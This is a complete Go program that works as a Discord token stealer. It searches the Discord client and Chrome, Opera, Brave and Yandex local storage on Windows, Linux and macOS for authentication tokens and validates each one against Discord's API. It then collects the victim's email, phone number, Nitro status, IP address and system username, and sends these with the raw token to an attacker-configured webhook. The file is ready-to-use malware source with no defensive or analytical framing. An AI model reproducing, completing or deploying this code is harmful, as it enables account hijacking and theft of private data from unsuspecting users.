package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/user"
	"regexp"
	"runtime"
	"strings"
	"time"
)

const (
	WebhookUrl       = "YOUR_WEBHOOK_URL"
	WebhookAvatarUrl = "YOUR_WEBHOOK_IMG"
	WebhookUsername  = "YOUR_WEBHOOK_NAME"
	DiscordApiUsers  = "https://discordapp.com/api/v6/users/@me"
	DiscordApiNitro  = "https://discord.com/api/v8/users/@me/billing/subscriptions"
	DiscordImgUrl    = "https://cdn.discordapp.com/avatars/"
	IpAddrGet        = "http://ipinfo.io/ip"
	Debug            = false
)

var tokenRe = regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")

func getPathWindows() (paths map[string]string) {
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")

	paths = map[string]string{
		"Lightcord":      roaming + "/Lightcord",
		"Discord":        roaming + "/Discord",
		"Discord Canary": roaming + "/discordcanary",
		"Discord PTB":    roaming + "/discordptb",
		"Google Chrome":  local + "/Google/Chrome/User Data/Default",
		"Opera":          roaming + "/Opera Software/Opera Stable",
		"Brave":          local + "/BraveSoftware/Brave-Browser/User Data/Default",
		"Yandex":         local + "/Yandex/YandexBrowser/User Data/Default",
	}

	return
}

func getPathLinuxAndMac() (paths map[string]string) {
	homedir, _ := os.UserHomeDir()

	paths = map[string]string{
		"Discord":        homedir + "/.config/discord",
		"Discord Canary": homedir + "/.config/discordcanary",
		"Discord PTB":    homedir + "/.config/discordptb",
		"Google Chrome":  homedir + "/.config/google-chrome/Default",
		"Opera":          homedir + "/.config/opera",
		"Brave":          homedir + "/.config/BraveSoftware",
		"Yandex Beta":    homedir + "/.config/yandex-browser-beta/Default",
		"Yandex":         homedir + "/.config/yandex-browser/Default",
		"Discord Mac":    homedir + "/Library/Application Support/discord/Local Storage/leveldb",
	}

	return
}

func doesItemExists(arr []string, item string) bool {

	for i := 0; i < len(arr); i++ {
		if arr[i] == item {
			return true
		}
	}

	return false
}

func getRequest(url string, isChecking bool, token string) (body string, err error) {
	// Setup the Request
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
	req.Header.Set("Content-Type", "application/json")
	// We are checking if the token is working
	if isChecking {
		req.Header.Set("Authorization", token)
	}

	if err != nil {
		return
	}

	client := &http.Client{}
	response, err := client.Do(req)

	if err != nil {
		return
	}

	if response.StatusCode != 200 {
		err = fmt.Errorf("GET %s Responded with status code: %d\n", url, response.StatusCode)
		return
	}

	defer response.Body.Close()

	b, err := io.ReadAll(response.Body)
	if err != nil {
		return
	}

	body = string(b)
	return
}

func isTokenValid(token string, tokenList []string) bool {

	if Debug {
		fmt.Printf("Checking if token is valid %s \n", token)
	}

	// Check if the token is a valid discord token !
	_, err := getRequest(DiscordApiUsers, true, token)
	if err != nil {
		if Debug {
			fmt.Printf("Invalid Token: %s", err.Error())
		}
		return false
	}

	// Check if the token is already stored in our token list
	if doesItemExists(tokenList, token) {
		if Debug {
			fmt.Printf("Token already exist !\n")
		}
		return false
	}

	if Debug {
		fmt.Printf("Valid Token !\n")
	}

	return true
}

func findTokens(path string) (tokenList []string) {

	path += "/Local Storage/leveldb/"
	files, _ := ioutil.ReadDir(path)

	for _, file := range files {
		name := file.Name()
		if strings.HasSuffix(name, ".log") || strings.HasSuffix(name, ".ldb") {

			content, _ := ioutil.ReadFile(path + "/" + name)
			lines := bytes.Split(content, []byte("\\n"))

			for _, line := range lines {
				for _, match := range tokenRe.FindAll(line, -1) {

					token := string(match)

					if isTokenValid(token, tokenList) {
						tokenList = append(tokenList, token)
					}
				}
			}
		}
	}

	return
}

func getJsonValue(key string, jsonData string) (value string) {

	// We will query only string from the json !!
	var result map[string]interface{}

	err := json.Unmarshal([]byte(jsonData), &result)
	if err != nil {
		return "Unknown"
	}

	value = fmt.Sprintf("%v", result[key])
	return
}

func grabTokenInformation(token string) (jsonEmbed string) {

	// Get User displayName
	var displayName string
	currentUser, err := user.Current()
	if err != nil {
		displayName = "Unknown"
	} else {
		displayName = currentUser.Name
	}

	// Get OS Type & Proc arch
	osName := runtime.GOOS
	cpuArch := runtime.GOARCH

	// Get computer IP
	var ip string
	body, err := getRequest(IpAddrGet, false, "")
	if err != nil {
		ip = "Unknown"
	} else {
		ip = body
	}

	var tokenInformation string
	body, err = getRequest(DiscordApiUsers, true, token)
	if err != nil {
		tokenInformation = "Unknown"
	} else {
		tokenInformation = body
	}

	discordUser := getJsonValue("username", tokenInformation) + "#" + getJsonValue("discriminator", tokenInformation)
	discordEmail := getJsonValue("email", tokenInformation)
	discordPhone := getJsonValue("phone", tokenInformation)
	discordAvatar := DiscordImgUrl + getJsonValue("id", tokenInformation) + "/" + getJsonValue("avatar", tokenInformation) + ".png"

	var discordNitro string
	body, err = getRequest(DiscordApiNitro, true, token)
	if err != nil {
		discordNitro = "Unknown"
	} else {

		if body == "[]" {
			discordNitro = "No"
		} else {
			discordNitro = "Yes"
		}
	}

	if Debug {
		fmt.Printf("DisplayName: %s\n", displayName)
		fmt.Printf("Os Name: %s\n", osName)
		fmt.Printf("CPU arch: %s\n", cpuArch)
		fmt.Printf("IP addr: %s\n", ip)
		fmt.Printf("Discord Username: %s\n", discordUser)
		fmt.Printf("Discord Email: %s\n", discordEmail)
		fmt.Printf("Discord Phone: %s\n", discordPhone)
		fmt.Printf("Discord Avatar: %s\n", discordAvatar)
		fmt.Printf("Discord Nitro: %s\n", discordNitro)
	}

	jsonEmbed = "{\"avatar_url\":\"" + WebhookAvatarUrl + "\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"icon_url\":\"https://i.imgur.com/Q8uuwN4.png\",\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"**Token**\",\"value\":\"```" + token + "```\"}]}],\"username\":\"" + WebhookUsername + "\"}"
	return
}

func sendEmbed(token string) {

	data := []byte(grabTokenInformation(token))
	req, _ := http.NewRequest("POST", WebhookUrl, bytes.NewBuffer(data))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
	req.Header.Set("Content-Type", "application/json; charset=UTF-8")
	cl := &http.Client{}
	response, err := cl.Do(req)
	if err != nil {
		if Debug {
			fmt.Printf("Error sending Embed: %s\n", err.Error())
		}
		panic(err)
	}

	defer response.Body.Close()
}

func getAllTokens(paths map[string]string) {

	for _, path := range paths {

		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}

		tokenList := findTokens(path)
		for _, token := range tokenList {
			sendEmbed(token)
		}
	}
}

func main() {

	if Debug {
		fmt.Println("Running grabber in Debug Mode ...")
	}

	goos := runtime.GOOS

	switch goos {
	case "windows":
		getAllTokens(getPathWindows())
	case "linux":
		getAllTokens(getPathLinuxAndMac())
	case "darwin":
		getAllTokens(getPathLinuxAndMac())
	default:
		if Debug {
			fmt.Printf("%s.\n", goos)
		}
	}
}
